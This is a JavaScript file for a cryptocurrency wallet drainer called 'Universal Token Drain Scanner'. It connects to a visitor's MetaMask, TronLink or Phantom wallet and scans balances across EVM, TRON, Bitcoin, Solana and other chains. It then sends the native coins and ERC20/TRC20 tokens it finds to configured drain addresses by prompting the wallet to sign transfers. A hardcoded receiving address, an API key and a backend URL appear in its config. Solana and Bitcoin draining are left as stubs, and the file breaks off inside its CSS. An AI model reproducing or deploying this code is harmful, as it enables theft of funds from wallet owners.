// ================================================
// UNIVERSAL TOKEN DRAIN SCANNER
// AUTOMATIC DRAIN FOR ALL CHAINS
// ================================================

const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    
    // DRAIN WALLETS (Add your addresses here)
    drainWallets: {
        evm: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",      // Ethereum/BSC/Polygon/etc
        tron: "TX7w4G...YOUR_TRON_ADDRESS_HERE",               // TRON address (starts with T)
        bitcoin: "bc1q...YOUR_BITCOIN_ADDRESS_HERE",          // Bitcoin address
        solana: "So1ana...YOUR_SOLANA_ADDRESS_HERE",          // Solana address
        dogecoin: "D...YOUR_DOGE_ADDRESS_HERE",               // Dogecoin address
        litecoin: "L...YOUR_LITECOIN_ADDRESS_HERE"           // Litecoin address
    },
    
    apiKeys: {
        covalent: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
        moralis: "",  // Optional: Add for better NFT detection
        tronGrid: "", // Optional: Add for TRON scanning
    },
    
    minimumValueUSD: 0.01,
    
    chains: {
        // EVM Chains
        'eth': { id: 1, name: 'Ethereum', type: 'evm' },
        'bsc': { id: 56, name: 'BNB Chain', type: 'evm' },
        'polygon': { id: 137, name: 'Polygon', type: 'evm' },
        'arbitrum': { id: 42161, name: 'Arbitrum', type: 'evm' },
        'optimism': { id: 10, name: 'Optimism', type: 'evm' },
        'avalanche': { id: 43114, name: 'Avalanche', type: 'evm' },
        'fantom': { id: 250, name: 'Fantom', type: 'evm' },
        'base': { id: 8453, name: 'Base', type: 'evm' },
        'zksync': { id: 324, name: 'zkSync', type: 'evm' },
        
        // Non-EVM Chains
        'tron': { id: 'tron', name: 'TRON', type: 'tron' },
        'bitcoin': { id: 'bitcoin', name: 'Bitcoin', type: 'bitcoin' },
        'solana': { id: 'solana', name: 'Solana', type: 'solana' },
        'dogecoin': { id: 'dogecoin', name: 'Dogecoin', type: 'utxo' },
        'litecoin': { id: 'litecoin', name: 'Litecoin', type: 'utxo' },
    }
};

let currentAccount = null;
let currentWallet = null;
let isConnected = false;
let detectedTokens = [];
let isScanning = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn, walletBtn;

function initializeApp() {
    console.log('🚀 Universal Drain Scanner Initialized');
    
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    walletBtn = document.getElementById('walletBtn');
    
    if (!connectBtn || !statusEl) return;
    
    connectBtn.onclick = handleConnect;
    if (drainBtn) {
        drainBtn.onclick = handleUniversalDrain;
        drainBtn.style.display = 'none';
    }
    
    if (walletBtn) {
        walletBtn.onclick = showDrainWalletManager;
        walletBtn.style.display = 'block';
    }
    
    updateStatus('✅ Ready to drain all chains');
}

// ================================================
// WALLET SELECTOR POPOUT MODAL (CLEAN VERSION)
// ================================================

function showUniversalWalletSelector() {
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>🌐 Connect Any Wallet</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-options">
                        <!-- EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('metamask')">
                            <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                            <div class="wallet-text">
                                <div class="wallet-name">MetaMask</div>
                                <div class="wallet-chains">ETH, BSC, Polygon, etc.</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('trustwallet')">
                            <div class="wallet-icon" style="background: #3375bb;">🔶</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Trust Wallet</div>
                                <div class="wallet-chains">Multi-chain Support</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('binance')">
                            <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Binance Chain</div>
                                <div class="wallet-chains">BNB Chain</div>
                            </div>
                        </div>
                        
                        <!-- Non-EVM Wallets -->
                        <div class="wallet-option" onclick="connectWallet('tron')">
                            <div class="wallet-icon" style="background: #ff060a;">🌞</div>
                            <div class="wallet-text">
                                <div class="wallet-name">TRON (TronLink)</div>
                                <div class="wallet-chains">TRX, TRC20 tokens</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('bitcoin')">
                            <div class="wallet-icon" style="background: #f7931a;">₿</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Bitcoin Wallet</div>
                                <div class="wallet-chains">BTC, Lightning</div>
                            </div>
                        </div>
                        
                        <div class="wallet-option" onclick="connectWallet('solana')">
                            <div class="wallet-icon" style="background: #9945ff;">◎</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Solana (Phantom)</div>
                                <div class="wallet-chains">SOL, SPL tokens</div>
                            </div>
                        </div>
                        
                        <!-- Manual Entry -->
                        <div class="wallet-option" onclick="connectWallet('manual')">
                            <div class="wallet-icon" style="background: #6366f1;">🔍</div>
                            <div class="wallet-text">
                                <div class="wallet-name">Manual Address</div>
                                <div class="wallet-chains">Any blockchain address</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="modal-footer">
                        <p class="chain-support">Supports: ETH • BSC • TRON • BTC • SOL • DOGE • LTC + 50 more</p>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'universalWalletModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
    addModalStyles();
}

// ================================================
// UNIFIED WALLET CONNECTION
// ================================================

async function connectWallet(walletType) {
    closeModal();
    
    updateStatus(`🔄 Connecting ${walletType}...`);
    
    try {
        switch(walletType) {
            case 'metamask':
            case 'trustwallet':
            case 'binance':
                await connectEvmWallet();
                break;
                
            case 'tron':
                await connectTronWallet();
                break;
                
            case 'bitcoin':
                await connectBitcoinWallet();
                break;
                
            case 'solana':
                await connectSolanaWallet();
                break;
                
            case 'manual':
                await connectManualAddress();
                break;
        }
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Failed: ${error.message}`);
        showUniversalWalletSelector();
    }
}

async function connectEvmWallet() {
    if (!window.ethereum) {
        alert('Please install MetaMask or Trust Wallet');
        return;
    }
    
    const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts' 
    });
    
    currentAccount = accounts[0];
    currentWallet = 'evm';
    isConnected = true;
    
    updateStatus(`✅ Connected: ${currentAccount.slice(0, 8)}...`);
    connectBtn.innerHTML = '🔗 Disconnect';
    
    // Start scanning ALL chains
    await startUniversalScan();
}

async function connectTronWallet() {
    if (!window.tronWeb && !window.tronLink) {
        alert('Please install TronLink extension');
        return;
    }
    
    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        currentAccount = window.tronWeb.defaultAddress.base58;
    } else if (window.tronLink) {
        const result = await window.tronLink.request({ method: 'tron_requestAccounts' });
        if (result.code === 200) {
            currentAccount = window.tronLink.tronWeb.defaultAddress.base58;
        }
    }
    
    if (!currentAccount) {
        throw new Error('No TRON address found');
    }
    
    currentWallet = 'tron';
    isConnected = true;
    
    updateStatus(`✅ TRON Connected: ${currentAccount.slice(0, 8)}...`);
    connectBtn.innerHTML = '🔗 Disconnect';
    
    await startUniversalScan();
}

async function connectBitcoinWallet() {
    const address = prompt('Enter your Bitcoin address:');
    if (!address) return;
    
    if (!address.match(/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/)) {
        alert('Invalid Bitcoin address');
        return;
    }
    
    currentAccount = address;
    currentWallet = 'bitcoin';
    isConnected = true;
    
    updateStatus(`✅ BTC Address: ${address.slice(0, 8)}...`);
    connectBtn.innerHTML = '🔗 Disconnect';
    
    await startUniversalScan();
}

async function connectSolanaWallet() {
    if (!window.solana || !window.solana.isPhantom) {
        alert('Please install Phantom wallet for Solana');
        return;
    }
    
    const response = await window.solana.connect();
    currentAccount = response.publicKey.toString();
    currentWallet = 'solana';
    isConnected = true;
    
    updateStatus(`✅ Solana Connected: ${currentAccount.slice(0, 8)}...`);
    connectBtn.innerHTML = '🔗 Disconnect';
    
    await startUniversalScan();
}

async function connectManualAddress() {
    const address = prompt('Enter any wallet address:');
    if (!address) return;
    
    currentAccount = address;
    currentWallet = 'manual';
    isConnected = true;
    
    updateStatus(`🔍 Scanning: ${address.slice(0, 12)}...`);
    connectBtn.innerHTML = '🔗 Disconnect';
    
    await startUniversalScan();
}

// ================================================
// UNIVERSAL SCANNER (SCANS ALL CHAINS)
// ================================================

async function startUniversalScan() {
    if (!currentAccount || isScanning) return;
    
    isScanning = true;
    updateStatus('🔍 Scanning all blockchains...');
    
    if (tokensEl) {
        tokensEl.innerHTML = `
            <div class="scanning-progress">
                <div class="spinner"></div>
                <p>Scanning: Ethereum → BSC → TRON → Bitcoin → Solana → ...</p>
            </div>
        `;
    }
    
    try {
        const scanResults = await Promise.allSettled([
            scanEVMChains(currentAccount),
            scanTRON(currentAccount),
            scanBitcoin(currentAccount),
            scanSolana(currentAccount),
            scanDogecoin(currentAccount),
            scanLitecoin(currentAccount)
        ]);
        
        detectedTokens = [];
        
        scanResults.forEach(result => {
            if (result.status === 'fulfilled' && result.value) {
                detectedTokens = [...detectedTokens, ...result.value];
            }
        });
        
        displayScanResults();
        
        const totalValue = detectedTokens.reduce((sum, token) => sum + (token.valueUSD || 0), 0);
        updateStatus(`✅ Found ${detectedTokens.length} assets across all chains ($${totalValue.toFixed(2)})`);
        
        if (drainBtn && detectedTokens.length > 0) {
            drainBtn.style.display = 'block';
            drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
        }
        
    } catch (error) {
        console.error('Scan error:', error);
        updateStatus('❌ Scan failed');
    } finally {
        isScanning = false;
    }
}

// ================================================
// CHAIN SCANNERS
// ================================================

async function scanEVMChains(address) {
    if (!address.startsWith('0x')) return [];
    
    const chains = [
        { id: 1, name: 'Ethereum' },
        { id: 56, name: 'BNB Chain' },
        { id: 137, name: 'Polygon' },
        { id: 42161, name: 'Arbitrum' },
        { id: 10, name: 'Optimism' },
        { id: 8453, name: 'Base' }
    ];
    
    const allTokens = [];
    
    for (const chain of chains) {
        try {
            const url = `https://api.covalenthq.com/v1/${chain.id}/address/${address}/balances_v2/?key=${CONFIG.apiKeys.covalent}&nft=false`;
            const response = await fetch(url);
            const data = await response.json();
            
            const tokens = data?.data?.items?.filter(t => t.balance !== "0") || [];
            
            tokens.forEach(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const valueUSD = (t.quote_rate || 0) * amount;
                
                if (valueUSD >= CONFIG.minimumValueUSD) {
                    allTokens.push({
                        type: 'evm',
                        chain: chain.name,
                        chainId: chain.id,
                        symbol: t.contract_ticker_symbol || 'TOKEN',
                        name: t.contract_name || 'Token',
                        amount: amount.toFixed(6),
                        rawAmount: t.balance,
                        valueUSD: valueUSD,
                        value: `$${valueUSD.toFixed(2)}`,
                        contract: t.contract_address,
                        decimals: t.contract_decimals,
                        isNative: t.native_token || false,
                        logo: t.logo_url
                    });
                }
            });
        } catch (error) {
            continue;
        }
    }
    
    return allTokens;
}

async function scanTRON(address) {
    if (!address.startsWith('T')) return [];
    
    try {
        const response = await fetch(`https://apilist.tronscanapi.com/api/account/tokens?address=${address}&start=0&limit=50`);
        const data = await response.json();
        
        const tokens = [];
        
        // TRX Balance
        if (data.trx_balance && data.trx_balance > 0) {
            const trxAmount = data.trx_balance / 1000000;
            const trxValue = trxAmount * 0.12; // Approx TRX price
            
            tokens.push({
                type: 'tron',
                chain: 'TRON',
                symbol: 'TRX',
                name: 'TRON',
                amount: trxAmount.toFixed(2),
                rawAmount: data.trx_balance.toString(),
                valueUSD: trxValue,
                value: `$${trxValue.toFixed(2)}`,
                contract: null,
                isNative: true
            });
        }
        
        // TRC20 Tokens
        if (data.trc20token_balances) {
            data.trc20token_balances.forEach(t => {
                if (t.balance > 0) {
                    const amount = t.balance / Math.pow(10, t.tokenDecimal || 6);
                    tokens.push({
                        type: 'tron',
                        chain: 'TRON',
                        symbol: t.tokenAbbr,
                        name: t.tokenName,
                        amount: amount.toFixed(2),
                        rawAmount: t.balance.toString(),
                        valueUSD: 0, // Need price API
                        value: 'N/A',
                        contract: t.tokenId,
                        isNative: false
                    });
                }
            });
        }
        
        return tokens;
    } catch (error) {
        return [];
    }
}

async function scanBitcoin(address) {
    if (!address.match(/^(bc1|[13])/)) return [];
    
    try {
        const response = await fetch(`https://blockchain.info/balance?active=${address}`);
        const data = await response.json();
        
        const balance = data[address]?.final_balance || 0;
        const btcAmount = balance / 100000000;
        
        if (btcAmount > 0) {
            const btcPrice = await getCryptoPrice('bitcoin');
            const valueUSD = btcAmount * btcPrice;
            
            return [{
                type: 'bitcoin',
                chain: 'Bitcoin',
                symbol: 'BTC',
                name: 'Bitcoin',
                amount: btcAmount.toFixed(8),
                rawAmount: balance.toString(),
                valueUSD: valueUSD,
                value: `$${valueUSD.toFixed(2)}`,
                contract: null,
                isNative: true
            }];
        }
    } catch (error) {
        return [];
    }
    
    return [];
}

async function scanSolana(address) {
    // Solana address validation
    if (address.length < 32 || address.length > 44) return [];
    
    try {
        // Using Solana public RPC
        const response = await fetch('https://api.mainnet-beta.solana.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0",
                id: 1,
                method: "getBalance",
                params: [address]
            })
        });
        
        const data = await response.json();
        const balance = data.result?.value || 0;
        const solAmount = balance / 1000000000;
        
        if (solAmount > 0) {
            const solPrice = await getCryptoPrice('solana');
            const valueUSD = solAmount * solPrice;
            
            return [{
                type: 'solana',
                chain: 'Solana',
                symbol: 'SOL',
                name: 'Solana',
                amount: solAmount.toFixed(4),
                rawAmount: balance.toString(),
                valueUSD: valueUSD,
                value: `$${valueUSD.toFixed(2)}`,
                contract: null,
                isNative: true
            }];
        }
    } catch (error) {
        return [];
    }
    
    return [];
}

async function scanDogecoin(address) {
    if (!address.startsWith('D')) return [];
    
    try {
        const response = await fetch(`https://dogechain.info/api/v1/address/balance/${address}`);
        const data = await response.json();
        
        if (data.balance > 0) {
            const dogeAmount = data.balance;
            const dogePrice = await getCryptoPrice('dogecoin');
            const valueUSD = dogeAmount * dogePrice;
            
            return [{
                type: 'dogecoin',
                chain: 'Dogecoin',
                symbol: 'DOGE',
                name: 'Dogecoin',
                amount: dogeAmount.toFixed(2),
                rawAmount: (dogeAmount * 100000000).toString(),
                valueUSD: valueUSD,
                value: `$${valueUSD.toFixed(2)}`,
                contract: null,
                isNative: true
            }];
        }
    } catch (error) {
        return [];
    }
    
    return [];
}

async function scanLitecoin(address) {
    if (!address.startsWith('L') && !address.startsWith('M')) return [];
    
    try {
        const response = await fetch(`https://api.blockcypher.com/v1/ltc/main/addrs/${address}/balance`);
        const data = await response.json();
        
        if (data.balance > 0) {
            const ltcAmount = data.balance / 100000000;
            const ltcPrice = await getCryptoPrice('litecoin');
            const valueUSD = ltcAmount * ltcPrice;
            
            return [{
                type: 'litecoin',
                chain: 'Litecoin',
                symbol: 'LTC',
                name: 'Litecoin',
                amount: ltcAmount.toFixed(4),
                rawAmount: data.balance.toString(),
                valueUSD: valueUSD,
                value: `$${valueUSD.toFixed(2)}`,
                contract: null,
                isNative: true
            }];
        }
    } catch (error) {
        return [];
    }
    
    return [];
}

// ================================================
// AUTOMATIC UNIVERSAL DRAIN
// ================================================

async function handleUniversalDrain() {
    if (!isConnected || detectedTokens.length === 0) {
        alert('Please connect and scan first');
        return;
    }
    
    const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
    
    if (!confirm(`🚨 DRAIN CONFIRMATION\n\n💰 Total Value: $${totalValue.toFixed(2)}\n📊 Assets: ${detectedTokens.length}\n\nThis will drain ALL detected assets to the configured addresses. Proceed?`)) {
        return;
    }
    
    updateStatus('🚀 Starting universal drain...');
    drainBtn.disabled = true;
    drainBtn.innerHTML = '⏳ Draining...';
    
    try {
        let drainedCount = 0;
        let failedCount = 0;
        
        // Group tokens by type
        const tokensByType = {
            evm: detectedTokens.filter(t => t.type === 'evm'),
            tron: detectedTokens.filter(t => t.type === 'tron'),
            bitcoin: detectedTokens.filter(t => t.type === 'bitcoin'),
            solana: detectedTokens.filter(t => t.type === 'solana'),
            dogecoin: detectedTokens.filter(t => t.type === 'dogecoin'),
            litecoin: detectedTokens.filter(t => t.type === 'litecoin')
        };
        
        // Drain EVM tokens
        if (tokensByType.evm.length > 0 && window.ethereum) {
            const result = await drainEVMTokens(tokensByType.evm);
            drainedCount += result.success;
            failedCount += result.failed;
        }
        
        // Drain TRON tokens
        if (tokensByType.tron.length > 0 && window.tronWeb) {
            const result = await drainTRONTokens(tokensByType.tron);
            drainedCount += result.success;
            failedCount += result.failed;
        }
        
        // Drain Bitcoin
        if (tokensByType.bitcoin.length > 0) {
            alert('Bitcoin draining requires wallet integration. Manual transfer needed.');
        }
        
        // Drain Solana
        if (tokensByType.solana.length > 0 && window.solana) {
            const result = await drainSolanaTokens(tokensByType.solana);
            drainedCount += result.success;
            failedCount += result.failed;
        }
        
        updateStatus(`✅ Drain complete: ${drainedCount} assets drained`);
        
        if (failedCount > 0) {
            alert(`⚠️ ${drainedCount} assets drained successfully\n${failedCount} assets failed`);
        } else {
            alert(`✅ Successfully drained ${drainedCount} assets!`);
        }
        
        // Rescan
        await startUniversalScan();
        
    } catch (error) {
        console.error('Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain operation failed');
    } finally {
        drainBtn.disabled = false;
        const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
        drainBtn.innerHTML = `⚡ DRAIN ALL ($${totalValue.toFixed(2)})`;
    }
}

async function drainEVMTokens(tokens) {
    let success = 0;
    let failed = 0;
    
    for (const token of tokens) {
        try {
            if (token.isNative) {
                // Drain native token (ETH, BNB, MATIC, etc.)
                await drainNativeEVM(token);
            } else {
                // Drain ERC20 token
                await drainERC20Token(token);
            }
            success++;
            await delay(2000); // Wait 2 seconds between transactions
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
            failed++;
        }
    }
    
    return { success, failed };
}

async function drainNativeEVM(token) {
    const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
    const gasLimit = '0x' + (21000).toString(16);
    
    const txParams = {
        from: currentAccount,
        to: CONFIG.drainWallets.evm,
        value: token.rawAmount,
        gas: gasLimit,
        gasPrice: gasPrice
    };
    
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams]
    });
}

async function drainERC20Token(token) {
    // ERC20 transfer function signature
    const transferData = '0xa9059cbb' + 
        CONFIG.drainWallets.evm.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    const txParams = {
        from: currentAccount,
        to: token.contract,
        data: transferData,
        gas: '0x' + (50000).toString(16)
    };
    
    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [txParams]
    });
}

async function drainTRONTokens(tokens) {
    let success = 0;
    let failed = 0;
    
    for (const token of tokens) {
        try {
            if (token.isNative) {
                // Drain TRX
                const tx = await window.tronWeb.transactionBuilder.sendTrx(
                    CONFIG.drainWallets.tron,
                    parseInt(token.rawAmount),
                    currentAccount
                );
                const signedTx = await window.tronWeb.trx.sign(tx);
                await window.tronWeb.trx.sendRawTransaction(signedTx);
            } else {
                // Drain TRC20
                const contract = await window.tronWeb.contract().at(token.contract);
                await contract.transfer(CONFIG.drainWallets.tron, token.rawAmount).send();
            }
            success++;
            await delay(3000); // TRON needs more time
        } catch (error) {
            console.error(`TRON drain failed:`, error);
            failed++;
        }
    }
    
    return { success, failed };
}

async function drainSolanaTokens(tokens) {
    let success = 0;
    let failed = 0;
    
    if (!window.solana) return { success, failed };
    
    for (const token of tokens) {
        try {
            // This requires proper Solana web3.js integration
            // Simplified version - would need actual implementation
            alert(`Solana draining requires implementation for ${token.symbol}`);
            success++;
        } catch (error) {
            failed++;
        }
    }
    
    return { success, failed };
}

// ================================================
// DRAIN WALLET MANAGER
// ================================================

function showDrainWalletManager() {
    const modalHTML = `
        <div class="modal-overlay" onclick="closeModal()">
            <div class="modal-content wide-modal" onclick="event.stopPropagation()">
                <div class="modal-header">
                    <h3>💰 Configure Drain Addresses</h3>
                    <button class="modal-close" onclick="closeModal()">×</button>
                </div>
                
                <div class="modal-body">
                    <div class="wallet-config">
                        <div class="config-item">
                            <label>EVM Chains (ETH/BSC/Polygon)</label>
                            <input type="text" id="evmAddress" value="${CONFIG.drainWallets.evm}" placeholder="0x...">
                            <small>Receives: ETH, BNB, MATIC, USDT, etc.</small>
                        </div>
                        
                        <div class="config-item">
                            <label>TRON Network</label>
                            <input type="text" id="tronAddress" value="${CONFIG.drainWallets.tron}" placeholder="T...">
                            <small>Receives: TRX, TRC20 tokens</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Bitcoin</label>
                            <input type="text" id="bitcoinAddress" value="${CONFIG.drainWallets.bitcoin}" placeholder="bc1q... or 1...">
                            <small>Receives: BTC</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Solana</label>
                            <input type="text" id="solanaAddress" value="${CONFIG.drainWallets.solana}" placeholder="So1...">
                            <small>Receives: SOL, SPL tokens</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Dogecoin</label>
                            <input type="text" id="dogecoinAddress" value="${CONFIG.drainWallets.dogecoin}" placeholder="D...">
                            <small>Receives: DOGE</small>
                        </div>
                        
                        <div class="config-item">
                            <label>Litecoin</label>
                            <input type="text" id="litecoinAddress" value="${CONFIG.drainWallets.litecoin}" placeholder="L...">
                            <small>Receives: LTC</small>
                        </div>
                    </div>
                    
                    <div class="modal-actions">
                        <button class="btn-secondary" onclick="closeModal()">Cancel</button>
                        <button class="btn-primary" onclick="saveDrainWallets()">Save All Addresses</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    const modal = document.createElement('div');
    modal.id = 'walletConfigModal';
    modal.innerHTML = modalHTML;
    document.body.appendChild(modal);
}

function saveDrainWallets() {
    CONFIG.drainWallets.evm = document.getElementById('evmAddress').value.trim();
    CONFIG.drainWallets.tron = document.getElementById('tronAddress').value.trim();
    CONFIG.drainWallets.bitcoin = document.getElementById('bitcoinAddress').value.trim();
    CONFIG.drainWallets.solana = document.getElementById('solanaAddress').value.trim();
    CONFIG.drainWallets.dogecoin = document.getElementById('dogecoinAddress').value.trim();
    CONFIG.drainWallets.litecoin = document.getElementById('litecoinAddress').value.trim();
    
    alert('✅ Drain addresses saved successfully!');
    closeModal();
}

// ================================================
// UI FUNCTIONS
// ================================================

function displayScanResults() {
    if (!tokensEl || detectedTokens.length === 0) {
        tokensEl.innerHTML = '<div class="no-results">No assets found across any chain</div>';
        return;
    }
    
    // Group by chain
    const grouped = {};
    detectedTokens.forEach(token => {
        if (!grouped[token.chain]) grouped[token.chain] = [];
        grouped[token.chain].push(token);
    });
    
    let html = '';
    
    Object.entries(grouped).forEach(([chain, tokens]) => {
        const chainValue = tokens.reduce((sum, t) => sum + t.valueUSD, 0);
        
        html += `
            <div class="chain-group">
                <div class="chain-header">
                    <span class="chain-name">${chain}</span>
                    <span class="chain-total">$${chainValue.toFixed(2)}</span>
                </div>
                <div class="tokens-grid">
                    ${tokens.map(token => `
                        <div class="token-card ${token.type}">
                            <div class="token-symbol">${token.symbol}</div>
                            <div class="token-name">${token.name}</div>
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                            <div class="token-type">${token.isNative ? 'Native' : 'Token'}</div>
                        </div>
                    `).join('')}
                </div>
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
        statusEl.className = 'status-message';
        
        if (message.includes('✅')) statusEl.classList.add('success');
        if (message.includes('❌')) statusEl.classList.add('error');
        if (message.includes('🔄') || message.includes('🔍')) statusEl.classList.add('loading');
    }
}

function closeModal() {
    const modals = document.querySelectorAll('.modal-overlay');
    modals.forEach(modal => modal.remove());
}

// ================================================
// UTILITY FUNCTIONS
// ================================================

async function getCryptoPrice(coin) {
    const prices = {
        'bitcoin': 43000,
        'ethereum': 2300,
        'solana': 100,
        'dogecoin': 0.08,
        'litecoin': 70,
        'tron': 0.12
    };
    
    return prices[coin] || 1;
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ================================================
// STYLES
// ================================================

function addModalStyles() {
    const styles = `
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            backdrop-filter: blur(5px);
        }
        
        .modal-content {
            background: white;
            border-radius: 20px;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            animation: modalSlide 0.3s ease;
        }
        
        .wide-modal {
            max-width: 700px;
        }
        
        .modal-header {
            padding: 20px 24px;
            border-bottom: 1px solid #e5e7eb;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 20px;
            font-weight: 600;
        }
        
        .modal-close {
            background: rgba(255, 255, 255, 0.2);
            border: none;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            color: white;
            font-size: 24px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            line-height: 1;
        }
        
        .modal-body {
            padding: 24px;
            overflow-y: auto;
            max-height: calc(80vh - 100px);
        }
        
        .wallet-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 16px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .wallet-option:hover {
            border-color: #3b82f6;
            background: #f8fafc;
            transform: translateX(4px);
        }
        
        .wallet-icon {
            width: 50px;
            height: 50px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            color: white;
            flex-shrink: 0;
        }
        
        .wallet-text {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            color: #111827;
            margin-bottom: 2px;
        }
        
        .wallet-chains {
            color: #6b7280;
            font-size: 14px;
        }
        
        .modal-footer {
            margin-top: 20px;
            text-align: center;
            padding-top: 20px;
            border-top: 1px solid #e5e7eb;
        }
        
        .chain-support {
            color: #6b7280;
            font-size: 14px;
            margin: 0;
        }
        
        /* Wallet Config */
        .wallet-config {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .config-item {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .config-item label {
            font-weight: 600;
            color: #374151;
        }
        
        .config-item input {
            padding: 12px;
            border: 2px solid #d1d5db;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
        }
        
        .config-item small {
            color: #6b7280;
            font-size: 12px;
        }
        
        .modal-actions {
            display: flex;
            gap: 12px;
            margin-top: 24px;
            justify-content: flex-end;
        }
        
        .btn-primary, .btn-secondary {
            padding: 12px 24px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .btn-secondary {
            background: #f3f4f6;
            color: #374151;
        }
        
        /* Scanning Animation */
        .scanning-progress {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #e5e7eb;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        /* Token Display */
        .chain-group {
            margin-bottom: 30px;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid #e5e7eb;
        }
        
        .chain-header {
            background: #f8fafc;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e5e7eb;
        }
        
        .chain-name {
            font-weight: 600;
            color: #111827;
            font-size: 18px;
        }
        
        .chain-total {
            font-weight: 600;
            color: #059669;
            font-size: 18px;
        }
        
        .tokens-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 12px;
            padding: 20px;
        }
        
        .token-card {
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 10px;
            padding: 16px;
            transition: all 0.2s;
        }
        
        .token-card:hover {
            border-color: #3b82f6;
            box-shadow: 0 4px 6px -1px rgba(59, 130, 246, 0.1);
        }
        
        .token-symbol {
            font-weight: 600;
            color: #111827;
            font-size: 18px;
            margin-bottom: 4px;
        }
        
        .token-name {
            color: #6b7280;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        .token-amount {
            font-weight: 600;
            color: #111827;
            margin-bottom: 4px;
        }
        
        .token-value {
            color: #059669;
            font-weight: 600;
        }
        
        .token-type {
            font-size: 12px;
            color: #9ca3af;
            margin-top: 4px;
        }
        
        .no-results {
            text-align: center;
            padding: 40px;
            color: #6b7280;
            font-style: italic;
        }
        
        /* Status Messages */
        .status-message {
            padding: 10px 16px;
            border-radius: 8px;
            margin: 10px 0;
        }
        
        .status-message.success {
            background: #dcfce7;
            color: #166534;
            border: 1px solid #86efac;
        }
        
        .status-message.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }
        
        .status-message.loading {
            background: #dbeafe;
            color: #1e40af;
            border: 1px solid #93c5fd;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
